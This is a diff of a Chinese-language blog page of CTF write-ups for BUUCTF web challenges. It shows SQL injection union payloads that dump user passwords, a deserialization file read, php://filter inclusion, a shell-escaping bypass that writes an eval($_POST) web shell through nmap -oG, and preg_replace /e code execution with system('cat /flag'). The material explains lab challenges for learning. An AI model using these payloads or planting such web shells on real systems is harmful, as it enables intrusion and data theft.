@@ -43,8 +43,9 @@
 <meta property="og:image" content="http://example.com/images/buu/3-2.png">
 <meta property="og:image" content="http://example.com/images/buu/3-3.png">
 <meta property="og:image" content="http://example.com/images/buu/4-1.png">
+<meta property="og:image" content="http://example.com/images/buu/4-3.png">
 <meta property="article:published_time" content="2023-07-13T02:31:07.000Z">
-<meta property="article:modified_time" content="2023-07-21T14:39:11.184Z">
+<meta property="article:modified_time" content="2023-07-21T14:46:29.800Z">
 <meta property="article:author" content="lwq">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://example.com/images/buu/1-1.png">
@@ -207,7 +208,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-07-21 22:39:11" itemprop="dateModified" datetime="2023-07-21T22:39:11+08:00">2023-07-21</time>
+                <time title="修改时间：2023-07-21 22:46:29" itemprop="dateModified" datetime="2023-07-21T22:46:29+08:00">2023-07-21</time>
               </span>
 
           
@@ -272,7 +273,7 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">?no=1 order by 4</span><br><span class="line"></span><br><span class="line">?no=-1 union/**/select/**/1,2,3,4</span><br><span class="line"></span><br><span class="line">?no=-1 union/**/select/**/1,group_concat(schema_name),3,4/**/from/**/information_schema.schemata</span><br><span class="line"></span><br><span class="line">?no=-1 union/**/select/**/1,group_concat(table_name),3,4/**/from/**/information_schema.tables/**/where/**/table_schema=&#x27;fakebook&#x27;</span><br><span class="line"></span><br><span class="line">?no=-1 union/**/select/**/1,group_concat(column_name),3,4/**/from/**/information_schema.columns/**/where/**/table_name=&#x27;users&#x27;</span><br><span class="line"></span><br><span class="line">?no=-1 union/**/select/**/1,group_concat(no,&#x27;~&#x27;,username,&#x27;~&#x27;,passwd,&#x27;~&#x27;,data),3,4/**/from/**/fakebook.users</span><br></pre></td></tr></table></figure>
 <p>构造反序列化POC</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class UserInfo</span><br><span class="line">&#123;</span><br><span class="line">    public $name = &quot;057&quot;;</span><br><span class="line">    public $age = 19;</span><br><span class="line">    public $blog = &quot;file:///var/www/html/flag.php&quot;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$res = new UserInfo();</span><br><span class="line">echo serialize($res);</span><br></pre></td></tr></table></figure>
-<p><code>O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;057&quot;;s:3:&quot;age&quot;;i:19;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;</code><br>payload<br>&#96;?no&#x3D;-1 union&#x2F;<strong>&#x2F;select&#x2F;</strong>&#x2F;1,2,3,’O:8:”UserInfo”:3:{s:4:”name”;s:3:”057”;s:3:”age”;i:19;s:4:”blog”;s:29:”file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php”;}’<br>查看源码发现flag</p>
+<p><code>O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;057&quot;;s:3:&quot;age&quot;;i:19;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;</code><br>payload<br><code>?no=-1 union/**/select/**/1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;057&quot;;s:3:&quot;age&quot;;i:19;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#39;</code><br>查看源码发现flag</p>
 <h1 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h1><p>打开环境，点击woofers和meowers发现出现了图片并且url会发生改变<br><code>http://f9389818-cc6c-4bba-994e-3c38b29f94e4.node4.buuoj.cn:81/index.php?category=woofers</code><br>猜测是文件包含漏洞或是sql注入<br>随便更改一下url发现报错了<br><img src="/images/buu/4-1.png" alt="1"><br>根据报错提示知道了是文件包含漏洞<br>直接包含&#x2F;flag发现包含不到，先用php:&#x2F;&#x2F;filter伪协议读一下index.php源码看看：<br><code>index.php?category=php://filter/read=convert.base64-encode/resource=index.php</code><br>发现报错了，根据报错知道它自己会在文件后面加上.php，导致变成index.php.php读取失败，删掉.php再尝试发现成功了，读到了源码，base64解码后<br>&#96;<br><?php
 　　$file = $_GET['category'];
 　　
@@ -291,42 +292,25 @@
 <p>经过escapeshellarg处理后变成了’172.17.0.2’&#39;‘ -v -d a&#x3D;1’，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。</p>
 <p>经过escapeshellcmd处理后变成’172.17.0.2’\‘’ -v -d a&#x3D;1&#39;，这是因为escapeshellcmd对\以及最后那个不配对儿的引号进行了转义：<a target="_blank" rel="noopener" href="http://php.net/manual/zh/function.escapeshellcmd.php">http://php.net/manual/zh/function.escapeshellcmd.php</a></p>
 <p>最后执行的命令是curl ‘172.17.0.2’\‘’ -v -d a&#x3D;1&#39;，由于中间的\被解释为\而不再是转义字符，所以后面的’没有被转义，与再后面的’配对儿成了一个空白连接符。所以可以简化为curl 172.17.0.2\ -v -d a&#x3D;1’，即向172.17.0.2\发起请求，POST 数据为a&#x3D;1’。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">然后往下看，看到echo system(&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host);</span><br><span class="line"></span><br><span class="line">这有个system来执行命令，而且有传参，肯定是利用这里了</span><br><span class="line"></span><br><span class="line">这里代码的本意是希望我们输入ip这样的参数做一个扫描，通过上面的两个函数来进行规则过滤转译，我们的输入会被单引号引起来，但是因为我们看到了上面的漏洞所以我们可以逃脱这个引号的束缚</span><br><span class="line"></span><br><span class="line">这里常见的命令后注入操作如 | &amp; &amp;&amp;都不行，虽然我们通过上面的操作逃过了单引号，但escapeshellcmd会对这些特殊符号前面加上\来转移…</span><br><span class="line"></span><br><span class="line">这时候就只有想想能不能利用nmap来做些什么了。</span><br><span class="line"></span><br><span class="line">这时候搜索可以发现在nmap命令中 有一个参数-oG可以实现将命令和结果写到文件</span><br><span class="line"></span><br><span class="line">这个命令就是我们的输入可控！然后写入到文件！OK很自然的想到了上传一个一句话木马了…</span><br><span class="line"></span><br><span class="line">payload</span><br><span class="line">`?host=&#x27; &lt;?php eval($_POST[&quot;v&quot;]);?&gt; -oG shell.php &#x27;`</span><br><span class="line">两边加单引号是因为，不加的话，两个函数执行后会变成：</span><br><span class="line">`&#x27;&lt;?php eval($_POST[&quot;v&quot;]);?&gt; -oG shell.php&#x27;</span><br><span class="line">就不是一条命令了，而是一串字符串而已，因为在解析单引号的时候 , 被单引号包裹的内容中如果有变量 , 这个变量名是不会被解析成值的，但是双引号不同 , bash 会将变量名解析成变量的值再使用。</span><br><span class="line"></span><br><span class="line">引号旁边加空格是因为，如果不加，当两个函数执行并echo出来后就会变成：</span><br><span class="line">`\&lt;?php eval($_POST[&quot;v&quot;]);?&gt; -oG shell.php\\`</span><br><span class="line">文件名变成shell.php\\，而不是shell.php</span><br><span class="line"></span><br><span class="line">最后会返回文件夹名，使用蚁剑连接即可</span><br><span class="line">![1](/images/buu/4-3.png)</span><br><span class="line"></span><br><span class="line"># [BJDCTF2020]ZJCTF，不过如此</span><br><span class="line">先代码审计，提示了next.php，想办法绕过题目的要求去回显next.php的base64加密内容</span><br><span class="line">可以看到要求存在text内容而且text内容强等于后面的字符串，而且先通过这个if才能执行下面的file参数。</span><br><span class="line">因为使用file_get_contents()函数打开text，想到可以使用data://协议</span><br><span class="line">payload</span><br><span class="line">`?text=data://text/plain,I have a dream&amp;file=php://filter/convert.base64-encode/resource=next.php`</span><br><span class="line">得到后base64解码</span><br></pre></td></tr></table></figure>
-<?php
-$id = $_GET['id'];
-$_SESSION['id'] = $id;
+<p>然后往下看，看到echo system(“nmap -T5 -sT -Pn –host-timeout 2 -F “.$host);</p>
+<p>这有个system来执行命令，而且有传参，肯定是利用这里了</p>
+<p>这里代码的本意是希望我们输入ip这样的参数做一个扫描，通过上面的两个函数来进行规则过滤转译，我们的输入会被单引号引起来，但是因为我们看到了上面的漏洞所以我们可以逃脱这个引号的束缚</p>
+<p>这里常见的命令后注入操作如 | &amp; &amp;&amp;都不行，虽然我们通过上面的操作逃过了单引号，但escapeshellcmd会对这些特殊符号前面加上\来转移…</p>
+<p>这时候就只有想想能不能利用nmap来做些什么了。</p>
+<p>这时候搜索可以发现在nmap命令中 有一个参数-oG可以实现将命令和结果写到文件</p>
+<p>这个命令就是我们的输入可控！然后写入到文件！OK很自然的想到了上传一个一句话木马了…</p>
+<p>payload<br><code>?host=&#39; &lt;?php eval($_POST[&quot;v&quot;]);?&gt; -oG shell.php &#39;</code><br>两边加单引号是因为，不加的话，两个函数执行后会变成：<br>&#96;’<?php eval($_POST["v"]);?> -oG shell.php’<br>就不是一条命令了，而是一串字符串而已，因为在解析单引号的时候 , 被单引号包裹的内容中如果有变量 , 这个变量名是不会被解析成值的，但是双引号不同 , bash 会将变量名解析成变量的值再使用。</p>
+<p>引号旁边加空格是因为，如果不加，当两个函数执行并echo出来后就会变成：<br><code>\&lt;?php eval($_POST[&quot;v&quot;]);?&gt; -oG shell.php\\</code><br>文件名变成shell.php\，而不是shell.php</p>
+<p>最后会返回文件夹名，使用蚁剑连接即可<br><img src="/images/buu/4-3.png" alt="1"></p>
+<h1 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h1><p>先代码审计，提示了next.php，想办法绕过题目的要求去回显next.php的base64加密内容<br>可以看到要求存在text内容而且text内容强等于后面的字符串，而且先通过这个if才能执行下面的file参数。<br>因为使用file_get_contents()函数打开text，想到可以使用data:&#x2F;&#x2F;协议<br>payload<br><code>?text=data://text/plain,I have a dream&amp;file=php://filter/convert.base64-encode/resource=next.php</code><br>得到后base64解码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$id = $_GET[&#x27;id&#x27;];</span><br><span class="line">$_SESSION[&#x27;id&#x27;] = $id;</span><br><span class="line"></span><br><span class="line">function complex($re, $str) &#123;</span><br><span class="line">    return preg_replace(</span><br><span class="line">        &#x27;/(&#x27; . $re . &#x27;)/ei&#x27;,</span><br><span class="line">        &#x27;strtolower(&quot;\\1&quot;)&#x27;,</span><br><span class="line">        $str</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">foreach($_GET as $re =&gt; $str) &#123;</span><br><span class="line">    echo complex($re, $str). &quot;\n&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function getFlag()&#123;</span><br><span class="line">	@eval($_GET[&#x27;cmd&#x27;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>先学习一下<a target="_blank" rel="noopener" href="https://www.cesafe.com/html/6999.html">&#x2F;e模式的漏洞</a></p>
+<p>e模式下的preg_replace可以让第二个参数’替换字符串’当作代码执行，但是这里第二个参数是不可变的，但因为有这种特殊的情况，正则表达式模式或部分模式两边添加圆括号会将相关匹配存储到一个临时缓存区，并且从1开始排序，而strtolower(“\1”)正好表达的就是匹配区的第一个（\1&#x3D;\1），从而我们如果匹配可以，则可以将函数实现。</p>
+<p>比如我们传入  <code>?.*=&#123;$&#123;phpinfo()&#125;&#125;</code></p>
+<p>原句：<code>preg_replace(&#39;/(&#39; . $re . &#39;)/ei&#39;,&#39;strtolower(&quot;\\1&quot;)&#39;,$str); </code><br>就变成<code>preg_replace(&#39;/(&#39; .* &#39;)/ei&#39;,&#39;strtolower(&quot;\\1&quot;)&#39;,&#123;$&#123;phpinfo()&#125;&#125;);</code></p>
+<p>又因为$_GET传入首字母是非法字符时候会把   .（点号）改成下划线，因此得将.<em>换成\s</em></p>
+<p>所以payload：<br><code>/next.php?\S*=$&#123;getFlag()&#125;&amp;cmd=system(%27ls%20/%27); </code><br><code>/next.php?\S*=$&#123;getFlag()&#125;&amp;cmd=system(&#39;cat /flag&#39;);</code></p>
 
-function complex($re, $str) {
-    return preg_replace(
-        '/(' . $re . ')/ei',
-        'strtolower("\\1")',
-        $str
-    );
-}
-
-
-foreach($_GET as $re => $str) {
-    echo complex($re, $str). "\n";
-}
-
-function getFlag(){
-    @eval($_GET['cmd']);
-}
-```
-先学习一下[/e模式的漏洞](https://www.cesafe.com/html/6999.html)
-
-e模式下的preg_replace可以让第二个参数'替换字符串'当作代码执行，但是这里第二个参数是不可变的，但因为有这种特殊的情况，正则表达式模式或部分模式两边添加圆括号会将相关匹配存储到一个临时缓存区，并且从1开始排序，而strtolower("\1")正好表达的就是匹配区的第一个（\\1=\1），从而我们如果匹配可以，则可以将函数实现。
-
-比如我们传入  ?.*={${phpinfo()}}
-
-原句：`preg_replace('/(' . $re . ')/ei','strtolower("\\1")',$str); `
-就变成`preg_replace('/(' .* ')/ei','strtolower("\\1")',{${phpinfo()}});`
-
-又因为$_GET传入首字母是非法字符时候会把   .（点号）改成下划线，因此得将\.*换成\s*
-
-所以payload：
-`/next.php?\S*=${getFlag()}&cmd=system(%27ls%20/%27); `
-`/next.php?\S*=${getFlag()}&cmd=system('cat /flag');`
     </div>
 
     
@@ -403,7 +387,7 @@ e模式下的preg_replace可以让第二个参数'替换字符串'当作代码�
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#BJDCTF2020-Easy-MD5"><span class="nav-number">1.</span> <span class="nav-text">[BJDCTF2020]Easy MD5</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8A%A4%E7%BD%91%E6%9D%AF-2018-easy-tornado"><span class="nav-number">2.</span> <span class="nav-text">[护网杯 2018]easy_tornado</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#HCTF-2018-admin-1"><span class="nav-number">3.</span> <span class="nav-text">[HCTF 2018]admin 1</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-HardSQL"><span class="nav-number">4.</span> <span class="nav-text">[极客大挑战 2019]HardSQL</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-AreUSerialz"><span class="nav-number">5.</span> <span class="nav-text">[网鼎杯 2020 青龙组]AreUSerialz</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Fakebook"><span class="nav-number">6.</span> <span class="nav-text">[网鼎杯 2018]Fakebook</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#BSidesCF-2020-Had-a-bad-day"><span class="nav-number">7.</span> <span class="nav-text">[BSidesCF 2020]Had a bad day</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#BJDCTF2020-Easy-MD5"><span class="nav-number">1.</span> <span class="nav-text">[BJDCTF2020]Easy MD5</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8A%A4%E7%BD%91%E6%9D%AF-2018-easy-tornado"><span class="nav-number">2.</span> <span class="nav-text">[护网杯 2018]easy_tornado</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#HCTF-2018-admin-1"><span class="nav-number">3.</span> <span class="nav-text">[HCTF 2018]admin 1</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-HardSQL"><span class="nav-number">4.</span> <span class="nav-text">[极客大挑战 2019]HardSQL</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-AreUSerialz"><span class="nav-number">5.</span> <span class="nav-text">[网鼎杯 2020 青龙组]AreUSerialz</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Fakebook"><span class="nav-number">6.</span> <span class="nav-text">[网鼎杯 2018]Fakebook</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#BSidesCF-2020-Had-a-bad-day"><span class="nav-number">7.</span> <span class="nav-text">[BSidesCF 2020]Had a bad day</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#BJDCTF2020-ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4"><span class="nav-number">8.</span> <span class="nav-text">[BJDCTF2020]ZJCTF，不过如此</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
